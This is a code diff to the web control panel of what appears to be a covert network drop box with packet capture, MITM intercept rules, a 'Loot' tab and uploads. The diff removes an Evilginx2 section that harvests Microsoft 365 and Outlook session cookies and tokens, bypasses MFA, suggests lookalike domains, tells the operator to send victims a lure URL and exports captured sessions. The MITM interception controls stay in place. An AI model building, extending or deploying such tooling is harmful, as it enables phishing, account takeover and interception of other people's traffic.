@@ -114,7 +114,6 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <div class="tab-nav">
 <button class="tab-btn active" onclick="switchTab('status')">Status</button>
 <button class="tab-btn" onclick="switchTab('mitm')">MITM</button>
-<button class="tab-btn" onclick="switchTab('evilginx')">Evilginx <span id="evilginxBadge" class="badge">0</span></button>
 <button class="tab-btn" onclick="switchTab('loot')">Loot <span id="lootBadge" class="badge">0</span></button>
 <button class="tab-btn" onclick="switchTab('upload')">Upload</button>
 </div>
@@ -153,7 +152,14 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <span id="capturePid">-</span>
 </div>
 </div>
-<h2 style="margin-bottom:15px;color:#667eea">Network Topology</h2>
+<h2 style="margin-bottom:15px;color:#667eea">Network Interfaces</h2>
+<div style="margin-bottom:10px;padding:10px;background:#1a1a2e;border-radius:6px;font-size:0.9em;color:#aaa">
+<div><strong style="color:#667eea">Interface Roles:</strong></div>
+<div style="margin-top:5px">• <strong>AP (Management):</strong> wlan0 - Management access point (always active when eth interfaces are in bridge mode)</div>
+<div>• <strong>Client (Internet):</strong> wlan1/wlan2 - External communications (Slack APIs, internet)</div>
+<div>• <strong>Bridge:</strong> br0 - Transparent Layer 2 bridge</div>
+<div>• <strong>Bridge Member:</strong> eth0/eth1 - Ethernet interfaces in bridge mode</div>
+</div>
 <div id="interfaces" class="interface-grid"></div>
 <div class="button-group">
 <button id="btnStart" class="btn btn-start">Start Capture</button>
@@ -226,77 +232,6 @@ input[type="text"]:focus{outline:none;border-color:#667eea}
 <h3 style="margin:20px 0 15px 0">Active Intercept Rules</h3>
 <div id="activeRules"></div>
 <button class="btn btn-danger" onclick="clearRules()" style="margin-top:15px">Clear All Rules</button>
-</div>
-
-<!-- EVILGINX TAB -->
-<div id="evilginxTab" class="tab-content">
-<div class="status-header">
-<h2>Evilginx2 - Microsoft Cookie Capture</h2>
-<div id="evilginxBadge2" class="status-badge inactive">
-<span class="status-indicator inactive"></span>
-<span>Inactive</span>
-</div>
-</div>
-
-<div class="info-box">
-<h4>Evilginx2 - OAuth Token & Cookie Harvester</h4>
-<p>Captures Microsoft 365 authentication tokens and session cookies, including MFA bypass.</p>
-<p><strong>Setup:</strong> DNS must point victim to this device, or use local DNS poisoning.</p>
-</div>
-
-<div id="evilginxNotInstalled" style="display:none;background:#ffe7e7;padding:20px;border-radius:8px;margin:15px 0;border-left:4px solid #e74c3c">
-<h3 style="color:#e74c3c;margin-bottom:15px">WARNING: Evilginx2 Not Installed</h3>
-<p style="margin-bottom:15px">Evilginx2 is required for OAuth token and cookie capture.</p>
-<button class="btn btn-start" onclick="installEvilginx()" style="margin-top:10px">Install Evilginx2 Now</button>
-<p style="margin-top:15px;font-size:.9em;color:#999">Installation takes 5-10 minutes (includes Go compiler build)</p>
-</div>
-
-<div id="evilginxInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
-<h3 style="color:#0066cc;margin-bottom:15px">Active Phishing</h3>
-<p style="margin:8px 0"><strong>Phishlet:</strong> <code id="evilginxPhishlet" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
-<p style="margin:8px 0"><strong>Lure URL:</strong> <code id="evilginxLure" style="background:#fff;padding:4px 8px;border-radius:4px;font-size:.85em">-</code></p>
-<p style="margin:8px 0"><strong>Bridge IP:</strong> <code style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
-<p style="margin-top:15px;font-size:.9em;color:#0066cc">Send victims to the lure URL. Captured sessions appear below.</p>
-</div>
-
-<h3 style="margin:20px 0 15px 0">Microsoft Phishlet Selection</h3>
-<div class="grid" style="margin-bottom:20px">
-<div class="card" style="border-left-color:#0078d4">
-<div class="card-title">Microsoft 365</div>
-<div style="font-size:.9em;color:#666;margin-top:8px">Outlook, SharePoint, Teams, OneDrive</div>
-<div style="margin-top:10px;font-size:.85em;color:#0078d4">Phishlet: o365</div>
-</div>
-<div class="card" style="border-left-color:#0072c6">
-<div class="card-title">Outlook.com</div>
-<div style="font-size:.9em;color:#666;margin-top:8px">Personal Outlook accounts</div>
-<div style="margin-top:10px;font-size:.85em;color:#0072c6">Phishlet: outlook</div>
-</div>
-</div>
-
-<h3 style="margin:20px 0 15px 0">Domain Configuration (Optional)</h3>
-<p style="margin-bottom:15px;color:#666">Leave empty for default (o365.local) or enter custom domain</p>
-<input type="text" id="evilginxDomain" placeholder="e.g., login-microsoft.com">
-
-<div class="button-group">
-<button id="btnStartO365" class="btn btn-start" onclick="startEvilginx('o365')">Start O365</button>
-<button id="btnStartOutlook" class="btn btn-start" onclick="startEvilginx('outlook')">Start Outlook</button>
-<button id="btnStopEvilginx" class="btn btn-stop" onclick="stopEvilginx()" disabled>Stop Evilginx</button>
-</div>
-
-<h3 style="margin:25px 0 15px 0">Captured Sessions</h3>
-<div id="evilginxSessions" class="logs-section" style="max-height:500px">
-<div style="color:#999;text-align:center;padding:40px">
-<div style="font-size:3em;margin-bottom:15px">[ ]</div>
-<p>No sessions captured yet</p>
-<p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p>
-</div>
-</div>
-
-<div class="button-group" style="margin-top:20px">
-<button class="btn btn-refresh" onclick="fetchStatus()">Refresh Sessions</button>
-<button class="btn btn-download" onclick="exportSessions()">Export Sessions (JSON)</button>
-<button class="btn btn-danger" onclick="clearSessions()">Clear All Sessions</button>
-</div>
 </div>
 
 <div id="lootTab" class="tab-content">
@@ -504,88 +439,6 @@ rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No acti
 }
 }
 }
-if(data.evilginx){
-const evilBadge=document.getElementById("evilginxBadge");
-const evilBadge2=document.getElementById("evilginxBadge2");
-const running=data.evilginx.running;
-const installed=data.evilginx.installed;
-const sessCount=data.evilginx.sessions_count||0;
-if(evilBadge)evilBadge.textContent=sessCount;
-if(evilBadge2){
-evilBadge2.className="status-badge "+(running?"active":"inactive");
-evilBadge2.innerHTML='<span class="status-indicator '+(running?"active":"inactive")+'"></span><span>'+(running?"Running":"Inactive")+'</span>';
-}
-const statusCard=document.getElementById("evilginxStatusCard");
-const installStatusEl=document.getElementById("evilginxInstallStatus");
-const pathEl=document.getElementById("evilginxPath");
-const btnInstall=document.getElementById("btnInstallEvilginx");
-if(statusCard){
-if(installed){
-statusCard.style.borderLeftColor="#27ae60";
-if(installStatusEl)installStatusEl.innerHTML='<span style="color:#27ae60">Installed</span>';
-if(pathEl)pathEl.textContent=data.evilginx.install_path||'/opt/evilginx2/evilginx';
-if(btnInstall)btnInstall.style.display="none";
-}else{
-statusCard.style.borderLeftColor="#e74c3c";
-if(installStatusEl)installStatusEl.innerHTML='<span style="color:#e74c3c">Not Installed</span>';
-if(pathEl)pathEl.textContent="Click below to install";
-if(btnInstall)btnInstall.style.display="block";
-}
-}
-const btnStartO365=document.getElementById("btnStartO365");
-const btnStartOutlook=document.getElementById("btnStartOutlook");
-const btnStopEvil=document.getElementById("btnStopEvilginx");
-const evilNotInstalled=document.getElementById("evilginxNotInstalled");
-const evilInfo=document.getElementById("evilginxInfo");
-if(!installed){
-if(btnStartO365)btnStartO365.disabled=true;
-if(btnStartOutlook)btnStartOutlook.disabled=true;
-if(btnStopEvil)btnStopEvil.disabled=true;
-if(evilNotInstalled)evilNotInstalled.style.display="block";
-if(evilInfo)evilInfo.style.display="none";
-}else{
-if(btnStartO365)btnStartO365.disabled=running;
-if(btnStartOutlook)btnStartOutlook.disabled=running;
-if(btnStopEvil)btnStopEvil.disabled=!running;
-if(evilNotInstalled)evilNotInstalled.style.display="none";
-if(evilInfo){
-if(running&&data.evilginx.lure_url){
-evilInfo.style.display="block";
-const phishEl=document.getElementById("evilginxPhishlet");
-const lureEl=document.getElementById("evilginxLure");
-if(phishEl)phishEl.textContent=data.evilginx.phishlet||"Unknown";
-if(lureEl)lureEl.textContent=data.evilginx.lure_url||"Unknown";
-}else{
-evilInfo.style.display="none";
-}
-}
-}
-const sessDiv=document.getElementById("evilginxSessions");
-if(sessDiv){
-if(data.evilginx.sessions&&data.evilginx.sessions.length>0){
-var sessHTML='';
-for(var i=0;i<data.evilginx.sessions.length;i++){
-var s=data.evilginx.sessions[i];
-sessHTML+='<div style="background:#fff;margin:10px 0;padding:15px;border-radius:8px;border-left:4px solid #28a745">';
-sessHTML+='<div style="display:flex;justify-content:space-between;margin-bottom:10px">';
-sessHTML+='<strong style="color:#28a745">Session #'+(i+1)+'</strong>';
-sessHTML+='<span style="color:#999;font-size:.85em">'+new Date(s.timestamp).toLocaleString()+'</span>';
-sessHTML+='</div>';
-sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Username:</strong> <code style="background:#f0f0f0;padding:2px 6px;border-radius:3px">'+(s.username||'N/A')+'</code></div>';
-sessHTML+='<div style="margin:8px 0;font-size:.95em"><strong>Phishlet:</strong> '+(s.phishlet||'N/A')+'</div>';
-sessHTML+='<details style="margin-top:10px"><summary style="cursor:pointer;color:#0066cc">Show Cookies & Tokens</summary>';
-sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.cookies||'No cookies')+'</pre>';
-sessHTML+='<pre style="background:#f8f8f8;padding:10px;margin-top:8px;border-radius:4px;font-size:.8em;overflow-x:auto;max-height:200px">'+escapeHtml(s.tokens||'No tokens')+'</pre>';
-sessHTML+='</details></div>';
-}
-sessDiv.innerHTML=sessHTML;
-}else if(running){
-sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>Waiting for victims...</p><p style="margin-top:10px;font-size:.9em">Share lure URL with targets</p></div>';
-}else{
-sessDiv.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No sessions captured yet</p><p style="margin-top:10px;font-size:.9em">Start Evilginx and send victims to lure URL</p></div>';
-}
-}
-}
 if(isActive){
 const captureFile=document.getElementById("captureFile");
 if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";
@@ -639,8 +492,13 @@ intfHTML+='<div class="interface-header">';
 intfHTML+='<span class="interface-name">'+intf.name+'</span>';
 intfHTML+='<span class="interface-status '+(intf.state==="UP"?"up":"down")+'">'+intf.state+'</span>';
 intfHTML+='</div>';
+if(intf.role_label){
+intfHTML+='<div class="interface-detail"><span>Role:</span><span style="font-weight:600;color:#667eea">'+(intf.role_label||"Unknown")+'</span></div>';
+}
 intfHTML+='<div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">'+(intf.mac||"N/A")+'</span></div>';
-intfHTML+='<div class="interface-detail"><span>Role:</span><span>'+(intf.role||"N/A")+'</span></div>';
+if(intf.ip&&intf.ip!=="N/A"){
+intfHTML+='<div class="interface-detail"><span>IP:</span><span style="font-family:monospace">'+(intf.ip||"N/A")+'</span></div>';
+}
 intfHTML+='</div>';
 }
 container.innerHTML=intfHTML;
@@ -694,43 +552,6 @@ async function disableMITM(){if(!confirm("Disable MITM and cleanup all rules?"))
 async function interceptCategory(category){const destination=document.getElementById("remoteIP").value.trim()?'remote':'local';const target=destination==='remote'?document.getElementById("remoteIP").value:'bridge IP';if(!confirm("Intercept "+category+" traffic?\n\nDestination: "+target))return;showAlert("Adding "+category+" intercept rules...","info");try{const res=await fetch("/api/mitm/intercept",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({category:category,destination:destination})});const data=await res.json();if(data.success){showAlert(category+" interception enabled ("+data.rules_added+" rules)","success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to add rules","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
 async function clearRules(){if(!confirm("Remove all intercept rules?"))return;try{const res=await fetch("/api/mitm/clear_rules",{method:"POST"});if(res.ok){showAlert("Rules cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
 
-async function startEvilginx(phishlet){const domain=document.getElementById("evilginxDomain").value.trim();const msg=domain?"Start Evilginx with "+phishlet+" phishlet using domain "+domain+"?":"Start Evilginx with "+phishlet+" phishlet using default domain?";if(!confirm(msg))return;document.getElementById("btnStartO365").disabled=true;document.getElementById("btnStartOutlook").disabled=true;showAlert("Starting Evilginx ("+phishlet+")...","info");try{const body={phishlet:phishlet};if(domain)body.domain=domain;const res=await fetch("/api/evilginx/start",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});const data=await res.json();if(data.success){showAlert("Evilginx started! Lure: "+data.lure_url,"success");setTimeout(fetchStatus,1000)}else{showAlert("Failed to start: "+(data.error||"Unknown error"),"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStartO365").disabled=false;document.getElementById("btnStartOutlook").disabled=false}}
-
-async function stopEvilginx(){if(!confirm("Stop Evilginx? Captured sessions will be saved."))return;showAlert("Stopping Evilginx...","info");try{const res=await fetch("/api/evilginx/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Evilginx stopped","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
-
-async function clearSessions(){if(!confirm("Clear all captured sessions?"))return;try{const res=await fetch("/api/evilginx/clear_sessions",{method:"POST"});if(res.ok){showAlert("Sessions cleared","success");setTimeout(fetchStatus,1000)}}catch(err){showAlert("Error: "+err.message,"error")}}
-
-function exportSessions(){window.location.href="/api/evilginx/sessions"}
-
-async function installEvilginx(){
-if(!confirm("Install Evilginx2?\n\nThis will:\n- Install Go compiler\n- Clone Evilginx2 repository\n- Build from source\n- Configure permissions\n\nThis may take 5-10 minutes."))return;
-const btn=document.getElementById("btnInstallEvilginx");
-if(btn){
-btn.disabled=true;
-btn.textContent="Installing...";
-}
-showAlert("Installing Evilginx2... This may take several minutes. Check logs for progress.","info");
-try{
-const res=await fetch("/api/evilginx/install",{method:"POST"});
-const data=await res.json();
-if(data.success){
-showAlert("Evilginx2 installed successfully! Path: "+data.path,"success");
-setTimeout(fetchStatus,2000);
-}else{
-showAlert("Installation failed: "+(data.error||"Unknown error"),"error");
-if(btn){
-btn.disabled=false;
-btn.textContent="Install Evilginx";
-}
-}
-}catch(err){
-showAlert("Installation error: "+err.message,"error");
-if(btn){
-btn.disabled=false;
-btn.textContent="Install Evilginx";
-}
-}
-}
 
 // Wait for DOM to be fully loaded before attaching event listeners
 console.log('Setting up DOMContentLoaded handler');
